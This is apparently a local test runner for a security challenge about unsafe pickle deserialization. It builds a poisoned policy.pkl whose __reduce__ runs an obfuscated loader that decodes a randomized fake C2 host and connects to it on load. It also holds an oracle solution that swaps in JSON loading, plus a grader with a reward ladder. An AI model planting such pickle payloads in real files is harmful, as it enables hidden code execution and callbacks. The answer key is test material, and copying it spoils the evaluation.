#!/usr/bin/env python3
"""Portable local runner for pickle-policy-rce (no Docker). Randomizes the
challenge each run, builds the env, runs the oracle, grades the capability ladder.
Usage: python local_test.py         (expect full reward)
"""
import pickle, base64, zlib, os, secrets, json, re, tempfile, subprocess, sys

EXPECTED_POLICY = {"threshold": 7, "mode": "strict"}


def _w(p, t, b=False):
    mode = "wb" if b else "w"
    kw = {} if b else {"newline": ""}
    with open(p, mode, **kw) as f:
        f.write(t)


def build(root):
    CACHE = os.path.join(root, "service", "cache"); SVC = os.path.join(root, "service", "src", "svc")
    MIRROR = os.path.join(root, "mirror")
    for d in (CACHE, SVC, MIRROR):
        os.makedirs(d, exist_ok=True)
    host = "sync-%s.telemetry-cdn.net" % secrets.token_hex(4)
    nonce = secrets.token_hex(8)
    stage2 = 'host="%s"\nscheme="https"\nnonce="%s"\n' % (host, nonce)
    KEY = secrets.token_bytes(4)
    blob = base64.b64encode(bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(zlib.compress(stage2.encode(), 9)))).decode()
    LOADER = ('import base64, zlib, socket\n_K=bytes.fromhex("%s")\n_D="%s"\n'
              'raw=base64.b64decode(_D)\n'
              'src=zlib.decompress(bytes(c^_K[i%%len(_K)] for i,c in enumerate(raw))).decode()\n'
              'ns={}\nexec(src,ns)\n'
              'try:\n    socket.create_connection((ns["host"],443),timeout=3)\nexcept Exception:\n    pass\n') % (KEY.hex(), blob)

    class P:
        def __reduce__(self):
            return (exec, (LOADER,))
    pkl = os.path.join(CACHE, "policy.pkl"); _w(pkl, pickle.dumps(P()), b=True)
    safe = os.path.join(MIRROR, "policy.json"); _w(safe, json.dumps(EXPECTED_POLICY))
    _w(os.path.join(SVC, "__init__.py"), "")
    _w(os.path.join(SVC, "config.py"),
       "import pickle\nPOLICY=r'%s'\ndef get():\n    with open(POLICY,'rb') as f:\n        return pickle.load(f)\n" % pkl)
    return dict(root=root, PKL=pkl, SAFE=safe, SVC_SRC=os.path.join(root, "service", "src"),
                CONFIG=os.path.join(SVC, "config.py"), REPORT=os.path.join(root, "report.json"),
                host=host, nonce=nonce)


def _decode(P):
    raw = open(P["PKL"], "rb").read().decode("latin-1")
    key = bytes.fromhex(re.search(r'_K=bytes\.fromhex\("([0-9a-f]+)"\)', raw).group(1))
    d = re.search(r'_D="([A-Za-z0-9+/=]+)"', raw).group(1)
    src = zlib.decompress(bytes(c ^ key[i % len(key)] for i, c in enumerate(base64.b64decode(d)))).decode()
    return re.search(r'host="([^"]+)"', src).group(1), re.search(r'nonce="([^"]+)"', src).group(1)


def oracle(P):
    host, nonce = _decode(P)
    json.dump({"vulnerable_call": "pickle.load", "artifact_path": P["PKL"], "trigger": "deserialization",
               "c2_host": host, "exfil_scheme": "https", "indicator_nonce": nonce,
               "primary_cwe": "CWE-502", "owasp_a": "A08:2021"}, open(P["REPORT"], "w"), indent=2)
    _w(P["CONFIG"], "import json\nSAFE=r'%s'\ndef get():\n    with open(SAFE) as f:\n        return json.load(f)\n" % P["SAFE"])


def grade(P):
    host, nonce = _decode(P)
    d = json.load(open(P["REPORT"])); g = lambda k: str(d.get(k, "")).strip()
    res = []
    def chk(n, c): res.append((n, bool(c)))
    KEYS = {"vulnerable_call","artifact_path","trigger","c2_host","exfil_scheme","indicator_nonce","primary_cwe","owasp_a"}
    chk("L0 keys", set(d) == KEYS)
    chk("L1 vulnerable_call", g("vulnerable_call").replace(" ", "").lower() == "pickle.load")
    chk("L2 artifact_path", os.path.normpath(g("artifact_path")) == os.path.normpath(P["PKL"]))
    chk("L3 trigger", g("trigger").lower() == "deserialization")
    chk("L4 cwe", g("primary_cwe").upper().replace(" ", "") == "CWE-502")
    chk("L5 owasp", g("owasp_a").upper().replace(" ", "") == "A08:2021")
    chk("L6 scheme", g("exfil_scheme").lower() == "https")
    chk("L7 c2_host (decoded, randomized)", g("c2_host").lower() == host.lower())
    chk("L8 nonce (decoded, randomized)", g("indicator_nonce").lower() == nonce.lower())
    env = dict(os.environ, PYTHONPATH=P["SVC_SRC"]); hit = os.path.join(P["root"], "hit")
    probe = ("import socket\nh={'n':0}\ndef t(*a,**k):\n h['n']+=1; raise OSError()\n"
             "socket.create_connection=t\nfrom svc.config import get\nget()\nopen(r'%s','w').write(str(h['n']))\n" % hit)
    subprocess.run([sys.executable, "-c", probe], env=env, check=True)
    chk("L9 no exec on load", open(hit).read().strip() == "0")
    o = subprocess.run([sys.executable, "-c", "from svc.config import get;import json;print(json.dumps(get()))"],
                       env=env, capture_output=True, text=True)
    chk("L10 functionality preserved", o.returncode == 0 and json.loads(o.stdout.strip() or "null") == EXPECTED_POLICY)
    passed = sum(1 for _, ok in res if ok)
    for n, ok in res:
        print(("  PASS " if ok else "  FAIL ") + n)
    print("\nREWARD = %d/%d = %.3f" % (passed, len(res), passed / len(res)))
    return passed / len(res)


if __name__ == "__main__":
    root = tempfile.mkdtemp(prefix="pprce_")
    P = build(root); print("Environment built at: " + root + "  (challenge randomized)")
    oracle(P); grade(P); print("(temp env left at %s)" % root)
